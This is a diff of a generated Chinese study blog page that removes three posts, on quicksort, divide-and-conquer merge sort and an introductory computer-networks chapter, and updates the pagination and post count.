-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-19T19:45:21+08:00">
-                2019-11-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/" itemprop="url" rel="index">
-                    <span itemprop="name">算法设计</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><h2 id="一、快排思想"><a href="#一、快排思想" class="headerlink" title="一、快排思想"></a>一、快排思想</h2><pre><code>快排其实就是冒泡的改进；主要思路就是划分元素——主元。
-例如：3 5 2 7 9 0 1 4
-    ___________________
-
-    1 0 2| 3 |9 7 5 4
-
-    左子序-|主元|-右子序
-
-    1 0 2| 3 |9 7 5 4</code></pre><h2 id="二、步骤"><a href="#二、步骤" class="headerlink" title="二、步骤"></a>二、步骤</h2><pre><code>1.划分：选定一个记录作为主元，以主元为基准将整个序列划分为两个子序列
-2.分别求解子问题
-3.合并子问题</code></pre><h2 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h2><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%BF%AB%E6%8E%920.png" alt="avatar"></p>
-<h2 id="四、过程"><a href="#四、过程" class="headerlink" title="四、过程"></a>四、过程</h2><pre><code>1.初始化：取第一个记录作为基准，设置两个参数i,j分别指向将要与基准记录进行比较的左侧和右侧记录
-2.右侧扫描，用基准记录与j指向的记录进行比较，重复此过程，直到右侧记录小结束，若i&lt;j,则将基准记录与j指向的记录进行交换
-3.左侧扫描，用基准记录与i指向的记录进行比较，重复此过程，直到右侧的记录大结束，若i&lt;j,则将基准记录与i指向的记录进行交换
-4.重复2，3步，直到i,j指向同一个位置</code></pre><h2 id="五、伪码"><a href="#五、伪码" class="headerlink" title="五、伪码"></a>五、伪码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">(<span class="keyword">int</span> r[],<span class="keyword">int</span> first,<span class="keyword">int</span> <span class="built_in">end</span>)</span></span>&#123;</span><br><span class="line">    i=first;j=<span class="built_in">end</span>; <span class="comment">//初始化</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">    	<span class="keyword">while</span>(i&lt;j&amp;&amp;r[i]&lt;=r[j]) j--; <span class="comment">//右侧扫描</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">        	r[i]&lt;--&gt;r[j]; <span class="comment">//将较小的记录交换到前面</span></span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;r[i]&lt;=r[j]) i++; <span class="comment">//左侧扫描</span></span><br><span class="line">        	<span class="keyword">if</span>(i&lt;j)&#123;</span><br><span class="line">            	r[j]&lt;--&gt;r[i]; <span class="comment">//将较大的记录交换到后面</span></span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    	<span class="keyword">return</span> i; <span class="comment">//i作为主元记录的最终位置</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span> r[ ], <span class="keyword">int</span> first, <span class="keyword">int</span> <span class="built_in">end</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (first&lt;<span class="built_in">end</span>) &#123;      </span><br><span class="line">        pivot=Partition(r, first, <span class="built_in">end</span>);  </span><br><span class="line">          <span class="comment">//问题分解，pivot是主元（轴值）在序列中的位置</span></span><br><span class="line">        QuickSort(r, first, pivot<span class="number">-1</span>); </span><br><span class="line">          <span class="comment">//递归地对左侧子序列进行快速排序</span></span><br><span class="line">        QuickSort(r, pivot+<span class="number">1</span>, <span class="built_in">end</span>);</span><br><span class="line">          <span class="comment">//递归地对右侧子序列进行快速排序</span></span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="@时间复杂度"></a>@时间复杂度</h3><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%BF%AB%E6%8E%921.png" alt="avatar"></p>
-<pre><code>最坏情况：  O(n^2)</code></pre><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%BF%AB%E6%8E%922.png" alt="avatar"></p>
-<pre><code>平均情况：O(n*logn)</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/19/%E5%88%86%E6%B2%BB%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="diao-diao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="diao-diao-UPUP">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/19/%E5%88%86%E6%B2%BB%E6%B3%95/" itemprop="url">分治法</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-19T17:41:24+08:00">
-                2019-11-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/" itemprop="url" rel="index">
-                    <span itemprop="name">算法设计</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="分治法"><a href="#分治法" class="headerlink" title="分治法"></a>分治法</h1><h2 id="一、分治思想"><a href="#一、分治思想" class="headerlink" title="一、分治思想"></a>一、分治思想</h2><pre><code>大问题分解为很多个子问题，最后合并</code></pre><h2 id="二、步骤："><a href="#二、步骤：" class="headerlink" title="二、步骤："></a>二、步骤：</h2><pre><code>1.划分子问题
-2.求解子问题
-3.合并子问题</code></pre><h2 id="三、归并："><a href="#三、归并：" class="headerlink" title="三、归并："></a>三、归并：</h2><pre><code>例子：
-3 5 2 7 9 0 1 4
-这里我们开辟出一个新的存放空间K,用两个指针i,j分别指向两个子问题的最开始元素；然后进行比较。最后变为：
-2 3 5 7 | 0 1 4 9
-再将这两个有序的子问题用相同的方法进行合并即可。 这就是归并的思想</code></pre><h2 id="四、伪码："><a href="#四、伪码：" class="headerlink" title="四、伪码："></a>四、伪码：</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort</span><span class="params">(<span class="keyword">int</span> r[],<span class="keyword">int</span> r1[],<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==R) r1[L]=r[L]; <span class="comment">//只有一个元素，直接赋值</span></span><br><span class="line">   		<span class="keyword">else</span>&#123;</span><br><span class="line">        	m=(L+R)/<span class="number">2</span>;</span><br><span class="line">          Mergesort(r,r1,L,m);	<span class="comment">//归并排序前半个子序列</span></span><br><span class="line">          Mergesort(r,r1,m+<span class="number">1</span>,R); <span class="comment">//归并排序后半个子序列</span></span><br><span class="line">      		 Merge(r1,r,L,m,R); <span class="comment">//合并两个已排序的子序列</span></span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> r[],<span class="keyword">int</span> r1[],<span class="keyword">int</span> L,<span class="keyword">int</span> m,<span class="keyword">int</span> R)</span></span>&#123;</span><br><span class="line">    	i=L;j=m+<span class="number">1</span>;k=L;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;=m&amp;&amp;j&lt;=t)&#123;</span><br><span class="line">        	<span class="keyword">if</span>(r[i]&lt;=r[j]) r1[k++]=r[i++];</span><br><span class="line">            <span class="keyword">else</span> r1[k++]=r[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;=m) <span class="keyword">while</span>(i&lt;=m)</span><br><span class="line">        	r1[k++]=r[i++];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">while</span>(j&lt;=R)</span><br><span class="line">        	r1[k++]=r[j++];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="@时间复杂度"></a>@时间复杂度</h3><pre><code>T（N）=O(n*logn)</code></pre><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="@空间复杂度"></a>@空间复杂度</h3><pre><code>O(n)</code></pre><h2 id="五、图解"><a href="#五、图解" class="headerlink" title="五、图解"></a>五、图解</h2><p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%88%86%E6%B2%BB0.png" alt="avatar"></p>
-<p><img src="/images/%E5%88%86%E6%B2%BB%E6%B3%95/%E5%88%86%E6%B2%BB1.png" alt="avatar"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="diao-diao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="diao-diao-UPUP">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url">第一章-绪论</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-18T20:14:15+08:00">
-                2019-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index">
-                    <span itemprop="name">计算机网络</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章-绪论"></a>第一章-绪论</h1><h2 id="主要知识"><a href="#主要知识" class="headerlink" title="主要知识"></a>主要知识</h2><pre><code>熟悉的网络有三大类：电信网络，有线电视网络和计算机网络
-
-计算机网络的主要功能是：资源共享和数据通信（具有连通信和共享性）
-
-计算机网络的组成：由若干结点和连接它们的链路组成
-
-ARPANET是互联网的雏形
-
-internet(互连网)是一个通用名词，泛指多个计算机网络互相连接的计算机网阔
-
-Internet(互联网）是一个专有名词，指全球目前最大的，开放的互连网
-
-ISP:互联网服务提供商（移动，电信，联通）</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/ISP%E6%A6%82%E5%BF%B5%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
-<pre><code>*互联网的拓扑结构虽然非常复杂，但是按照工作方式分，可以分为：
-边缘部分和核心部分
-
-边缘部分：由所有连接在互联网上的主机组成，用户可以直接使用（资源共享和数据通信）
-核心部分：由网络和连接这些网络的路由器组成，为边缘部分提供服务</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%A0%B8%E5%BF%83%E8%BE%B9%E7%BC%98%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
-<pre><code>网络边缘的通信方式通常可以划分为两大类：客户-服务器方式（C/S）和对等方式（C/S）
-
-关于两者的区别：
-前者强调服务者与被服务者的关系，后者没有，后者其实就是前者的双向应用</code></pre><p>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/CS%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"><br>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%AF%B9%E7%AD%89%E8%BF%9E%E6%8E%A5%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
-<pre><code>   核心部分起特殊作用的是：路由器；作用是存储转发
-
-边缘部分和核心部分的工作方式是什么？
-
-边缘部分由连接在互联网上的主机组成，用户可以直接使用资源共享，数据通信
-核心部分由网络和连接网络的路由器组成，核心部分的工作方式其实就是路由器的工作方式，即存储转发
-
-交换技术分别有哪几种？它们的区别是什么？
-
-交换技术主要有电路交换，报文交换，分组交换；
-电路交换将报文的比特流连续从源点直达重点，像在管道中传送
-报文交换是整个报文先到相邻节点，全部存储下来之后再查找转发表，进行转发
-分组交换其实就是将报文交换中的报文拆分为多个分组，存储转发</code></pre><p> <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="avatar"></p>
-<pre><code> 计算机网络按范围分：
-广域网（WAN），城域网（MAN）,局域网(LAN)，个人区域网(PAN)
-
-按用户分：
-专用网和公用网
-
-计算机网络性能指标：
-速率，带宽，时延，时延带宽积，吞吐量，往返时间RTT，利用率
-
-速率：数据传输的速率
-带宽：表示某通道传输数据的能力
-时延：分为发送时延，传播时延，处理时延和排队时延
-时延带宽积：时延*带宽
-吞吐量：单位时间内，通过某网络的实际数据量
-往返时间RTT：从发送开始计时直到发送方收到接收方的确认
-利用率：信道的利用率
-
-计算机网络体系结构，最有名的是两种：OSI参考模型和TCP/IP的四层协议</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt="avatar"></p>
-<h2 id="部分习题："><a href="#部分习题：" class="headerlink" title="部分习题："></a>部分习题：</h2><pre><code>C/S和P2P的主要区别是什么？有什么相同的地方？
-前者强调服务者与被服务者的关系，后者没有，后者其实就是前者的双向应用
-
-计算机网络有哪些常用的性能指标？
-速率，带宽，吞吐量，时延，时延带宽积，往返时间RTT,利用率
-
-网络协议的三要素是什么？有什么含义？
-语法：即数据与控制信息的结构或格式
-语义：即需要发出何种控制信息，完成何种动作
-同步：即事件发生的顺序</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BB%AA%E8%AE%BA.png" alt="avatar"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/">&lt;i class=&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&lt;i class=&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
   </nav>
 
 
@@ -1893,7 +2003,7 @@ ISP:互联网服务提供商（移动，电信，联通）</code></pre><p><img s
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
